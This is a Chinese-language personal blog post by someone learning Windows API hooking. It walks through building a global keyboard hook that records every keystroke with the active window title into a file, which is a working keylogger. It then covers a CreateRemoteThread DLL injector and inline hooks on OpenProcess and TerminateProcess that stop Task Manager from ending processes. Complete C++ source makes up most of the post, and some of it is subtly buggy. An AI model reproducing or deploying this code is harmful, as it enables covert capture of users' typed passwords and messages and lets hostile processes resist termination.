# hook- 任务管理器和键盘
hook learn

# Hook learn

## Tools
vs 2019
对的仅此而已


## Hook 概念
HOOK API技术，是指截获系统或进程对某个API函数的调用，使得API的执行流程转向我们指定的代码段，从而实现我们所需的功能。Windows下的每个进程均拥有自己的地址空间，并且进程只能调用其地址空间内的函数，因此HOOK API尤为关键的一步是，设法将自己的代码段注入到目标进程中，才能进一步实现对该进程调用的API进行拦截。然而微软并没有提供HOOK API的调用接口，这就需要开发者自己编程实现，大家所熟知的防毒软件、防火墙软件等均采用HOOK API实现。

## 函数
**安装钩子**：
```cpp
 SetWindowsHookEx(
 	_In_ int idHook,          // 要hook的类型，比如键盘消息，鼠标消息
    _In_ HOOKPROC lpfn,       // hook时要执行的函数指针
    _In_opt_ HINSTANCE hmod,  // 这个hook函数所在dll的句柄
    _In_ DWORD dwThreadId);   // 线程id，一般用不到，直接NULL就可以了
 )
```
更具上面的参数来拓展
`idHook`，要hook的类型
```cpp
WH_KEYBOARD    //键盘消息
WH_MOUSE       //监视从GetMessage 或者 PeekMessage 函数返回的鼠标消息
WH_GETMESSAGE  //监视从GetMessage or PeekMessage函数返回的消息。你可以使用WH_GETMESSAGE Hook去监视鼠标和键盘输入，以及其他发送到消息队列中的消息
WH_DEBUG       //在系统调用系统中与其他Hook关联的Hook子程之前，系统会调用WH_DEBUG Hook子程
……
```
其他的可以去看[MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)中的文档


`HOOKPROC lpfn`,一个回调函数，直接F12,看看这个类型的定义
`typedef LRESULT (CALLBACK* HOOKPROC)(int code, WPARAM wParam, LPARAM lParam);`
我要自己定义一个这样的回调函数
直接复制稍微改一下就能用
```cpp
LRESULT CALLBACK hookproc(int code, WPARAM wParam, LPARAM lParam) {
// 要执行的操作
}
```


`HINSTANCE hmod`，实例句柄
可以用`GetModuleHandle(L"Dll-hook")`拿到对应进程实例句柄


## 实例
### hook键盘获取输入：
看视频学习的，[b站学习网站(√)](https://www.bilibili.com/video/BV194411i71t?from=search&seid=9177458908484689415)


键盘钩子，获取输入的字符和当前输入框的标题栏，写入文件，放在c盘
里面比较坑的地方是，我用win10，没办法直接在C盘中写东西，参考[csdn](https://blog.csdn.net/lewky_liu/article/details/84594637)解决


idea和操作系统版本：vs2019，win10 1909
**step1:**
vs中新建一个空白解决方案，然后在其中创建两个项目，一个是windows应用程序，一个是dll程序
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597290385887-79abe42f-3e9b-40f0-9ddf-d8b996d6ed66.png#align=left&display=inline&height=804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1607&originWidth=600&size=80232&status=done&style=none&width=300)
dll-hook是写我们要hook的关键逻辑，keyboard只是一个启动dll的win程序
**step2:**
dll中定义一个hook函数 
我现在framwork.h中添加两行来导出这个hook函数
```cpp
extern "C" _declspec(dllexport) bool Hook();
bool Hook();
```
在dllmain.cpp中写Hook函数的主要逻辑，其中的DllMain函数不动就好
```cpp
bool Hook() {
    hHook = SetWindowsHookEx(
        WH_KEYBOARD,
        hookproc,
        GetModuleHandle(L"Dll-hook"),
        NULL
    );
    if (hHook == NULL) return false;
    MessageBox(NULL, L"钩子装好了", L"提示", NULL);
    return true;
}
```
安装好钩子我给自己一个tips，来一个弹窗，那行可以不要
需要注意的是hookproc是一个回调函数，按上面写的操作，我在framwork.h中添加一行代码
```cpp
LRESULT CALLBACK hookproc(int code, WPARAM wParam, LPARAM lParam);
```
然后就是hook我要进行的操作编写在这个hookproc函数中
主要是，获取输入框标题栏，获取输入的字符，写入文件
```cpp
LRESULT CALLBACK hookproc(int code, WPARAM wParam, LPARAM lParam) {
    //MessageBox(NULL, L"有人按键了", L"钩子处理函数", NULL);
    // 拿到当前操作窗口的标题
    //      先拿到当前操作窗口的句柄
    HWND hWnd = ::GetActiveWindow();//获取当前活动窗口
    if (hWnd == NULL) {
        // 如果当前无活动窗口，获取顶层窗口
        hWnd = ::GetForegroundWindow();
        if (hWnd == NULL) {
            // 如果啥窗口都没，那他按键不记录了
            // 下一次再次调用hook
            return CallNextHookEx(hHook,code,wParam, lParam);
        }
    }
    //      从句柄中拿到标题
    char windowsTestBuff[256] = { 0 };
    GetWindowTextA(hWnd, windowsTestBuff, 255);
    // 拿到键盘按下字符
    //      排除某些不能拿的键，比如esc
    if (code<0||code==HC_NOREMOVE)
        return CallNextHookEx(hHook, code, wParam, lParam);
    if (lParam & 0x40000000)
        return CallNextHookEx(hHook, code, wParam, lParam);
    //      获取按键字符
    char keyTexrBuff[256] = { 0 };
    GetKeyNameTextA(lParam, keyTexrBuff, 255);
    // 拼接标题栏字符和输入字符
    char buff[256] = { 0 };
    sprintf(buff, "%s --- %s\n", windowsTestBuff, keyTexrBuff);
    // 保存文件
    FILE* fp = fopen("C:\\key.txt", "a");
    fprintf(fp, buff);
    fclose(fp);
    return CallNextHookEx(hHook, code, wParam, lParam);
}
```
**step3:**
在keyboard项目中调用dll
思路是在窗口创建时就hook键盘消息
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597300704257-9ad45a92-92c5-4c19-b2d8-4c2ae0be6d61.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1818&size=98019&status=done&style=none&width=909)
在WndProc函数中添加一个case，`WM_CREATE`是创建窗口的时候
记得要自定义一个DLLWITHLIB的函数指针，名字随便啦
**step4**:
先生成dll，然后把dll放入keyboard文件夹，再运行
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597301179632-e71f3609-fb03-42c8-9d96-d4772bb5144b.png#align=left&display=inline&height=720&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1440&originWidth=1080&size=1681775&status=done&style=none&width=540)
**step4：**
运行
记录下了按键
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597301262387-e7d7b325-6fcd-4fd2-b535-ff464125e28e.png#align=left&display=inline&height=380&margin=%5Bobject%20Object%5D&name=image.png&originHeight=760&originWidth=1932&size=95520&status=done&style=none&width=966)
### hook任务管理器
参考看雪这篇[文章](https://bbs.pediy.com/thread-228669.htm)
通过hook openProcess这个API，修改openProcess这个API，直接跳转到我们定义的代码


思路
OpenProcess在kernalbase.dll中，用LoadLibrary加载kernalbase.dll得到基址，
然后后用GetProcessAddress找到OpenProcess的地址
替换kernelbase.dll里面的**OpenProcess**的前面5个字节为jmp跳转到我们自己的地址

**step1:**
新建一个空白解决方案
新建一个hook任务管理器的dll项目，和一个dll注入的空白项目
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597312117443-30d02c39-7242-46df-99e3-3076df60256a.png#align=left&display=inline&height=804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1607&originWidth=600&size=69066&status=done&style=none&width=300)
**step2:**
dll代码用上面文章的代码，稍微改了一点点，没什么差别
```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
DWORD oldProtect;
BYTE  JmpBtye[5];
BYTE  OldByte[5];
void * OpenProcessaddr;
bool H1_OpenProcess();
void UnHook();
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        H1_OpenProcess();
        break;
    case DLL_PROCESS_DETACH:
        UnHook();
        break;
    }
    return TRUE;
}
 
HANDLE MyOpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId)
{
    dwDesiredAccess &= ~PROCESS_TERMINATE;//去掉关闭程序的权限
    UnHook();//恢复Hook 任何调整到原来的地方执行.
    HANDLE h = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
    H1_OpenProcess();
    return h;
}
 
 
 
void * F1_OpenProcess()
{
    //寻找到OpenProcess的地址
    void * addr = 0;
    //加载kernel32.dll
    HMODULE hModule = LoadLibraryA("kernelbase.dll");
    //获取OpenProcess的地址
    addr=(void *)GetProcAddress(hModule, "OpenProcess");
    return addr;
}
 
 
void * F2_OpenProcess()
{
    return (void *)OpenProcess;
}
 
 
bool H1_OpenProcess()
{
    //1.开始寻找地址
    void * addr = F1_OpenProcess();
    OpenProcessaddr = addr;
    //判断是否寻找成功
    if (addr == 0)
    {
        MessageBoxA(NULL,"寻找地址失败",NULL,0);
        return false;
    }
    //2.进行Hook
 
    /*
    一般代码段是不可写的,我们需要把其改为可读可写.
    */
    VirtualProtect((void *)addr, 5, PAGE_EXECUTE_READWRITE,&oldProtect);
 
    //修改前面的5个字节为jmp 跳转到我们的代码.
    //内联Hook 跳转偏移计算方式:跳转偏移=目标地址-指令地址-5
    //jmp 的OpCode 为:0xE9
 
    JmpBtye[0] = 0xE9;
    *(DWORD *)&JmpBtye[1] = (DWORD)((long long)MyOpenProcess - (long long)addr - 5);
    //保存原先字节
    memcpy(OldByte, (void *)addr, 5);
    //替换原先字节
    memcpy((void *)addr, JmpBtye, 5);
}
 
void UnHook()
{
    //恢复原先字节
    memcpy((void *)OpenProcessaddr, OldByte, 5);
    //恢复属性
    DWORD p;
    VirtualProtect((void *)OpenProcessaddr, 5, oldProtect, &p);
}
```
注入器代码用我写的[Dll编写和注入](https://mi1itray_axe.gitee.io/2020/08/06/DLL%E7%BC%96%E5%86%99%E5%92%8C%E6%B3%A8%E5%85%A5/)这篇的简单注入代码改一下
```cpp
#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <io.h>
#include <tchar.h>
using namespace std;

bool InjectDLL(DWORD pid, LPCTSTR dllpath) {
    HANDLE                  hProcess = NULL;//保存目标进程的句柄
    LPVOID                  pRemoteBuf = NULL;//目标进程开辟的内存的起始地址
    DWORD                   dwBufSize = (DWORD)(_tcslen(dllpath) + 1) * sizeof(TCHAR);//开辟的内存的大小
    LPTHREAD_START_ROUTINE  pThreadProc = NULL;//loadLibreayW函数的起始地址
    HMODULE                 hMod = NULL;//kernel32.dll模块的句柄
    BOOL                    bRet = FALSE;

    //打开目标进程，获得句柄
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //开辟一块内存
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
    //向内存中复制dll路径
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllpath, dwBufSize, NULL);
    //获取kernel32.dll
    hMod = GetModuleHandle(L"kernel32.dll");
    //从kernel32.dll中获取loadLibraryW的地址
    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");
    //远程线程
    HANDLE hRemoteThread;
    hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    if (hRemoteThread) {
        MessageBox(NULL, L"注入成功", L"提示", NULL);
        return true;
    }
    else
    {
        MessageBox(NULL, L"注入失败", L"提示", NULL);
        return false;
    }
}


int main() {
    //6666是任务管理器的pid，自己改就是了
    InjectDLL(6666, L"C:\\Users\\axe\\source\\repos\\DLLInject\\Debug\\hook任务管理器.dll");
    return 0;
}
```
**
**step3:**
记得上面注入器的dll路径要先放好dll
然后打开任务管理器，查看一下任务管理器的pid
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597312875811-3ae2e832-476e-44ef-aac8-3eb6786b3ae4.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=176&originWidth=1262&size=44796&status=done&style=none&width=631)
别关任务管理器啊
修改注入器中的代码，把6666改成8916，编译运行（小心，64位电脑这时候得x64编译）
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597313009600-f33e0ee8-8ca3-4089-a000-2d7d2a9877b3.png#align=left&display=inline&height=531&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1061&originWidth=1980&size=70429&status=done&style=none&width=990)
任务管理器随便关一个试试
关火绒好像关不了，但是别的程序我关了几个，难道不行？我照着作者的注入再加了个提升权限也还是没用
找了好多文章，都是这么个意思，但我尝试代码都没有成功
很是老火


然后实验了很久很久发现，我路径写错了。。。，vs下x64的文件在x64文件夹下。。。
改了路径后，任务管理器直接卡死了。。。
尝试hook api还是成功了，大概。。就这么个意思把，累了


我想了一下，openProcess可以用到的地方太多，我可能打断了任务管理器的正常运转，任务管理器最终还是用TerminateProcess来终止程序，那我们把hook对象改成这个api就可以了，稍微改一下dll代码，思路没变，假的api直接给个弹窗提示一下


```cpp
#include "pch.h"
#define SIZE 6  

typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);
BOOL WINAPI MyTerminateProcess(HANDLE, UINT);

void BeginRedirect(LPVOID);

pTerminateProcess pOrigMBAddress = NULL;
BYTE oldBytes[SIZE] = { 0 };
BYTE JMP[SIZE] = { 0 };
DWORD oldProtect;
DWORD myProtect = PAGE_EXECUTE_READWRITE;

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        pOrigMBAddress = (pTerminateProcess)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "TerminateProcess");
        if (pOrigMBAddress != NULL)
            BeginRedirect(MyTerminateProcess);
        break;
    case DLL_PROCESS_DETACH: // if library unload
        memcpy(pOrigMBAddress, oldBytes, SIZE);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

void BeginRedirect(LPVOID newFunction)
{
    BYTE tempJMP[SIZE] = { 0xE9, 0x90, 0x90, 0x90, 0x90, 0xC3 };
    memcpy(JMP, tempJMP, SIZE);
    DWORD JMPSize = ((DWORD)newFunction - (DWORD)pOrigMBAddress - 5);
    VirtualProtect((LPVOID)pOrigMBAddress, SIZE, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(oldBytes, pOrigMBAddress, SIZE);
    memcpy(&JMP[1], &JMPSize, 4);
    memcpy(pOrigMBAddress, JMP, SIZE);
    VirtualProtect((LPVOID)pOrigMBAddress, SIZE, oldProtect, NULL);
}

BOOL  WINAPI MyTerminateProcess(HANDLE hProcess, UINT uExitCode)
{
    MessageBoxA(0, "关不掉嘞", "Hooked", MB_ICONERROR);
    return false;
}
```
注入还是一样，这次，记住千万千万dll要64位下的dll
![image.png](https://cdn.nlark.com/yuque/0/2020/png/2212593/1597567423634-91fc3304-79af-4df5-b89a-0dd7ec11bd9a.png#align=left&display=inline&height=458&margin=%5Bobject%20Object%5D&name=image.png&originHeight=916&originWidth=1332&size=258226&status=done&style=none&width=666)
老泪纵横


这种还是有点局限，还需要继续学习，小炮冲！
